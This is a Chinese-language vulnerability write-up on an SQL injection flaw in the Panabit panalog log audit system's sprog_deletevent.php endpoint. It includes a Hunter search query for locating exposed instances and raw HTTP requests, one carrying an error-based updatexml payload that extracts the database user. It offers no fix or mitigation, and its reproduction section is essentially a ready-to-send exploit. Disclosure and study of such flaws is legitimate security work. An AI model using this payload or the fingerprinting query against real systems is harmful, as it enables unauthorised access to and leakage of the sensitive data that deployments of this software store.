# panabit日志审计系统sprog_deletevent存在SQL注入漏洞

# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。panalog日志审计系统sprog_deletevent存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征

![1699191878681-4fe56d76-6ee5-4a90-af37-1cf8a983f57f.png](./img/NBje5ZQnkKxGETyn/1699191878681-4fe56d76-6ee5-4a90-af37-1cf8a983f57f-759328.png)

# 四、漏洞复现
```java
GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1702202129097-d75320e4-8326-46f1-85ac-183a93a23400.png](./img/NBje5ZQnkKxGETyn/1702202129097-d75320e4-8326-46f1-85ac-183a93a23400-648104.png)

```java
GET /Maintain/sprog_deletevent.php?openid=1&id=1&cloudip=1 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1702203492043-58bc7c32-9f32-4a11-9ef5-5ba8e08312da.png](./img/NBje5ZQnkKxGETyn/1702203492043-58bc7c32-9f32-4a11-9ef5-5ba8e08312da-650390.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bsile5w0tmgnvcvi>